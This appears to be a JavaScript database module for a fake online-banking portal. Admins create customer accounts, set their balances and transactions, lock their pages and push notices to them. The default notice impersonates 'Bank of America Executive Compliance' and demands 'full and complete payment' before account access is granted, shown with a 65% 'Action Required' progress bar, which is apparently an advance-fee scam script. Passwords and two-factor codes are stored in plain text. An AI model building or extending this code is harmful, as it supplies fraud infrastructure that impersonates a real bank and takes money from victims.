import path from 'path';
import fs from 'fs-extra';
import { createClient } from '@libsql/client';

const DATA_DIR = path.join(process.cwd(), 'data');
const DATA_FILE = path.join(DATA_DIR, 'bankData.json');
const SQLITE_FILE = path.join(DATA_DIR, 'bank.db');

// Turso Cloud or Local SQLite file fallback
const tursoUrl = process.env.TURSO_DATABASE_URL || process.env.TURSO_DB_URL || process.env.DATABASE_URL;
const tursoToken = process.env.TURSO_AUTH_TOKEN || process.env.TURSO_DB_AUTH_TOKEN || process.env.DATABASE_AUTH_TOKEN;

let client = null;

export function getDbClient() {
  if (!client) {
    try {
      fs.ensureDirSync(DATA_DIR);
    } catch (_) { }

    const isCloud = tursoUrl && tursoUrl.trim() !== '' && !tursoUrl.startsWith('file:');
    const dbUrl = isCloud
      ? tursoUrl.trim()
      : `file:${SQLITE_FILE.replace(/\\/g, '/')}`;

    client = createClient({
      url: dbUrl,
      authToken: isCloud && tursoToken ? tursoToken.trim() : undefined,
    });
  }
  return client;
}

export const INITIAL_DATA = {
  users: [],
  accounts: [],
  transactions: []
};

import {
  ALL_NAVIGATION_MENUS,
  ALL_MENU_IDS,
  DEFAULT_CORE_MENU_IDS,
  normalizeMenuIds,
  DEFAULT_ADMIN_PERMISSIONS,
  normalizeAdminPermissions,
} from './navigationConfig.js';

export const DEFAULT_NOTICE = {
  enabled: false,
  showPopup: true,
  sendAsMessage: false,
  subject: "Official Account & Compliance Notice",
  sender: "Bank of America Executive Compliance",
  category: "Notices",
  sentAt: "",
  message: "Notice: Please note that full and complete payment is required before access and authorization to your online account and credit card can be granted. Kindly ensure all outstanding balances are settled to avoid delays.",
  progress: 65,
  progressStatus: "65% • Action Required",
  progressLabel: "Authorization Progress",
  messages: [],
};

export const ALL_PAGES = ALL_NAVIGATION_MENUS;
export const DEFAULT_ALLOWED_PAGES = ALL_MENU_IDS;
export const normalizePagesList = normalizeMenuIds;

function mapUserRow(row) {
  let notice = DEFAULT_NOTICE;
  if (row.notice) {
    try {
      notice = typeof row.notice === 'string' ? JSON.parse(row.notice) : row.notice;
    } catch (_) {
      notice = DEFAULT_NOTICE;
    }
  }

  let allowedPages = DEFAULT_ALLOWED_PAGES;
  if (row.allowedPages !== undefined && row.allowedPages !== null) {
    try {
      const parsed = typeof row.allowedPages === 'string' ? JSON.parse(row.allowedPages) : row.allowedPages;
      if (Array.isArray(parsed)) {
        allowedPages = normalizePagesList(parsed);
      }
    } catch (_) {
      allowedPages = DEFAULT_ALLOWED_PAGES;
    }
  }

  let lockedPages = [];
  if (row.lockedPages) {
    try {
      const parsed = typeof row.lockedPages === 'string' ? JSON.parse(row.lockedPages) : row.lockedPages;
      if (Array.isArray(parsed)) {
        lockedPages = normalizePagesList(parsed);
      }
    } catch (_) {
      lockedPages = [];
    }
  }

  let adminPermissions = DEFAULT_ADMIN_PERMISSIONS;
  if (row.adminPermissions) {
    try {
      const parsed = typeof row.adminPermissions === 'string' ? JSON.parse(row.adminPermissions) : row.adminPermissions;
      adminPermissions = normalizeAdminPermissions(parsed);
    } catch (_) {
      adminPermissions = DEFAULT_ADMIN_PERMISSIONS;
    }
  }

  return {
    id: String(row.id),
    name: String(row.name),
    email: String(row.email),
    password: String(row.password),
    twoFactorCode: row.twoFactorCode ? String(row.twoFactorCode) : '',
    role: row.role ? String(row.role) : 'user',
    status: row.status ? String(row.status) : 'active',
    phone: row.phone ? String(row.phone) : '',
    address: row.address ? String(row.address) : '',
    createdAt: row.createdAt ? String(row.createdAt) : '',
    notice,
    allowedPages,
    lockedPages,
    tokenVersion: Number(row.tokenVersion) || 1,
    createdByAdminId: row.createdByAdminId ? String(row.createdByAdminId) : '',
    createdByAdminName: row.createdByAdminName ? String(row.createdByAdminName) : '',
    adminPermissions,
  };
}

function mapAccountRow(row) {
  return {
    id: String(row.id),
    userId: String(row.userId),
    userName: String(row.userName || ''),
    accountNumber: String(row.accountNumber || ''),
    fullAccountNumber: String(row.fullAccountNumber || ''),
    routingNumber: String(row.routingNumber || ''),
    type: String(row.type || 'Checking'),
    balance: Number(row.balance) || 0,
    status: String(row.status || 'active'),
  };
}

function mapTxRow(row) {
  return {
    id: String(row.id),
    userId: String(row.userId),
    userName: String(row.userName || ''),
    accountNumber: String(row.accountNumber || ''),
    type: String(row.type || 'debit'),
    description: String(row.description || ''),
    amount: Number(row.amount) || 0,
    date: String(row.date || ''),
    time: String(row.time || ''),
    category: String(row.category || 'Transfer'),
    status: String(row.status || 'completed'),
  };
}

let isInitialized = false;
let initPromise = null;

export async function ensureDbInitialized() {
  if (isInitialized) return;
  if (initPromise) return initPromise;

  initPromise = (async () => {
    try {
      const db = getDbClient();

      await db.execute(`
        CREATE TABLE IF NOT EXISTS users (
          id TEXT PRIMARY KEY,
          name TEXT NOT NULL,
          email TEXT UNIQUE NOT NULL,
          password TEXT NOT NULL,
          twoFactorCode TEXT,
          role TEXT DEFAULT 'user',
          status TEXT DEFAULT 'active',
          phone TEXT,
          address TEXT,
          createdAt TEXT,
          notice TEXT,
          allowedPages TEXT,
          lockedPages TEXT DEFAULT '[]',
          tokenVersion INTEGER DEFAULT 1,
          createdByAdminId TEXT DEFAULT '',
          createdByAdminName TEXT DEFAULT '',
          adminPermissions TEXT DEFAULT '{}'
        );
      `);

      // Migration: Ensure tokenVersion exists on existing users table
      try {
        await db.execute('ALTER TABLE users ADD COLUMN tokenVersion INTEGER DEFAULT 1;');
      } catch (_) { }

      // Migration: Ensure lockedPages exists on existing users table
      try {
        await db.execute("ALTER TABLE users ADD COLUMN lockedPages TEXT DEFAULT '[]';");
      } catch (_) { }

      // Migration: Ensure createdByAdminId, createdByAdminName, and adminPermissions exist on existing users table
      try {
        await db.execute("ALTER TABLE users ADD COLUMN createdByAdminId TEXT DEFAULT '';");
      } catch (_) { }
      try {
        await db.execute("ALTER TABLE users ADD COLUMN createdByAdminName TEXT DEFAULT '';");
      } catch (_) { }
      try {
        await db.execute("ALTER TABLE users ADD COLUMN adminPermissions TEXT DEFAULT '{}';");
      } catch (_) { }

      await db.execute(`
        CREATE TABLE IF NOT EXISTS accounts (
          id TEXT PRIMARY KEY,
          userId TEXT NOT NULL,
          userName TEXT,
          accountNumber TEXT,
          fullAccountNumber TEXT,
          routingNumber TEXT,
          type TEXT,
          balance REAL DEFAULT 0,
          status TEXT DEFAULT 'active'
        );
      `);

      await db.execute(`
        CREATE TABLE IF NOT EXISTS transactions (
          id TEXT PRIMARY KEY,
          userId TEXT NOT NULL,
          userName TEXT,
          accountNumber TEXT,
          type TEXT,
          description TEXT,
          amount REAL,
          date TEXT,
          time TEXT,
          category TEXT,
          status TEXT
        );
      `);

      isInitialized = true;
    } catch (err) {
      console.error('Error initializing Turso/SQLite database schema:', err);
    } finally {
      initPromise = null;
    }
  })();

  return initPromise;
}

export async function getBankData() {
  await ensureDbInitialized();
  try {
    const db = getDbClient();

    const [usersRes, accountsRes, txsRes] = await Promise.all([
      db.execute('SELECT * FROM users'),
      db.execute('SELECT * FROM accounts'),
      db.execute('SELECT * FROM transactions ORDER BY date DESC, time DESC'),
    ]);

    const users = usersRes.rows.map(mapUserRow);
    const accounts = accountsRes.rows.map(mapAccountRow);
    const transactions = txsRes.rows.map(mapTxRow);

    if (users.length === 0) {
      try {
        if (await fs.pathExists(DATA_FILE)) {
          const fileData = await fs.readJson(DATA_FILE);
          if (fileData?.users?.length) {
            await saveBankData(fileData);
            return fileData;
          }
        }
      } catch (_) {}
    }

    const bankData = { users, accounts, transactions };
    globalThis.__BANK_DATA__ = bankData;
    return bankData;
  } catch (err) {
    console.error('Error fetching bank data from Turso/SQLite:', err);
    if (globalThis.__BANK_DATA__) return globalThis.__BANK_DATA__;
    return INITIAL_DATA;
  }
}

export async function saveBankData(data) {
  await ensureDbInitialized();
  globalThis.__BANK_DATA__ = data;
  let saved = false;

  try {
    const db = getDbClient();
    const statements = [
      'DELETE FROM users',
      'DELETE FROM accounts',
      'DELETE FROM transactions',
    ];

    for (const user of (data.users || [])) {
      statements.push({
        sql: `INSERT INTO users (id, name, email, password, twoFactorCode, role, status, phone, address, createdAt, notice, allowedPages, lockedPages, tokenVersion, createdByAdminId, createdByAdminName, adminPermissions)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        args: [
          user.id,
          user.name,
          user.email,
          user.password,
          user.twoFactorCode || '',
          user.role || 'user',
          user.status || 'active',
          user.phone || '',
          user.address || '',
          user.createdAt || new Date().toISOString().split('T')[0],
          JSON.stringify(user.notice || DEFAULT_NOTICE),
          JSON.stringify(user.allowedPages || DEFAULT_ALLOWED_PAGES),
          JSON.stringify(user.lockedPages || []),
          user.tokenVersion || 1,
          user.createdByAdminId || '',
          user.createdByAdminName || '',
          JSON.stringify(user.adminPermissions || DEFAULT_ADMIN_PERMISSIONS),
        ],
      });
    }

    for (const acc of (data.accounts || [])) {
      statements.push({
        sql: `INSERT INTO accounts (id, userId, userName, accountNumber, fullAccountNumber, routingNumber, type, balance, status)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        args: [
          acc.id,
          acc.userId,
          acc.userName || '',
          acc.accountNumber || '',
          acc.fullAccountNumber || '',
          acc.routingNumber || '',
          acc.type || 'Checking',
          Number(acc.balance) || 0,
          acc.status || 'active',
        ],
      });
    }

    for (const tx of (data.transactions || [])) {
      statements.push({
        sql: `INSERT INTO transactions (id, userId, userName, accountNumber, type, description, amount, date, time, category, status)
              VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
        args: [
          tx.id,
          tx.userId,
          tx.userName || '',
          tx.accountNumber || '',
          tx.type || 'debit',
          tx.description || '',
          Number(tx.amount) || 0,
          tx.date || '',
          tx.time || '',
          tx.category || 'Transfer',
          tx.status || 'completed',
        ],
      });
    }

    await db.batch(statements, 'write');
    saved = true;
  } catch (err) {
    console.error('Error saving bank data to Turso/SQLite:', err);
  }

  try {
    await fs.ensureDir(DATA_DIR);
    await fs.writeJson(DATA_FILE, data, { spaces: 2 });
  } catch (_) { }

  return saved;
}

export async function findUserByEmail(email) {
  if (!email) return null;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM users WHERE LOWER(email) = LOWER(?) LIMIT 1',
      args: [email.trim()],
    });
    if (res.rows.length > 0) {
      return mapUserRow(res.rows[0]);
    }
  } catch (err) {
    console.error('Error finding user by email in Turso/SQLite:', err);
  }
  return null;
}

export async function findUserById(id) {
  if (!id) return null;
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM users WHERE id = ? LIMIT 1',
      args: [id],
    });
    if (res.rows.length > 0) {
      return mapUserRow(res.rows[0]);
    }
  } catch (err) {
    console.error('Error finding user by ID in Turso/SQLite:', err);
  }
  return null;
}

export async function getAccountsForUser(userId) {
  if (!userId) return [];
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM accounts WHERE userId = ?',
      args: [userId],
    });
    return res.rows.map(mapAccountRow);
  } catch (err) {
    console.error('Error getting accounts for user in Turso/SQLite:', err);
  }
  return [];
}

export async function getTransactionsForUser(userId) {
  if (!userId) return [];
  await ensureDbInitialized();
  try {
    const db = getDbClient();
    const res = await db.execute({
      sql: 'SELECT * FROM transactions WHERE userId = ? ORDER BY date DESC, time DESC',
      args: [userId],
    });
    return res.rows.map(mapTxRow);
  } catch (err) {
    console.error('Error getting transactions for user in Turso/SQLite:', err);
  }
  return [];
}

export { DEFAULT_ADMIN_PERMISSIONS, normalizeAdminPermissions };

/**
 * Resolves live admin identity, status, permissions, and tenant scoping from bankData.
 */
export function resolveAdminContext(auth, data) {
  const session = auth?.session;
  if (!session) {
    return { valid: false, status: 401, error: 'Unauthorized.' };
  }

  if (session.role === 'superadmin') {
    return {
      valid: true,
      isSuperAdmin: true,
      adminId: session.id || 'admin-1',
      adminName: session.name || 'Super Administrator',
      adminEmail: session.email || '',
      permissions: { ...DEFAULT_ADMIN_PERMISSIONS },
      hasPerm: () => true,
      canAccessUser: (u) => Boolean(u && u.role !== 'admin' && u.role !== 'superadmin'),
    };
  }

  if (session.role === 'admin') {
    const adminRecord = (data.users || []).find(
      (u) => u.role === 'admin' && (u.id === session.id || (session.email && u.email?.toLowerCase() === session.email.toLowerCase()))
    );

    if (!adminRecord) {
      return { valid: false, status: 401, error: 'Administrator account not found or removed by Super Admin.' };
    }

    const sessionVer = Number(session.tokenVersion) || 1;
    const recordVer = Number(adminRecord.tokenVersion) || 1;
    if (sessionVer < recordVer) {
      return { valid: false, status: 401, error: 'Your administrator session was terminated by Super Admin. Please sign in again.' };
    }

    if (['blocked', 'suspended', 'inactive'].includes(adminRecord.status)) {
      return { valid: false, status: 403, error: `Your administrator account is ${adminRecord.status}. Contact Super Admin.` };
    }

    const permissions = normalizeAdminPermissions(adminRecord.adminPermissions);
    return {
      valid: true,
      isSuperAdmin: false,
      adminId: adminRecord.id,
      adminName: adminRecord.name,
      adminEmail: adminRecord.email,
      permissions,
      hasPerm: (permId) => permissions[permId] !== false,
      canAccessUser: (u) =>
        Boolean(
          u &&
          u.role !== 'admin' &&
          u.role !== 'superadmin' &&
          u.createdByAdminId === adminRecord.id
        ),
    };
  }

  return { valid: false, status: 403, error: 'Administrative privileges required.' };
}
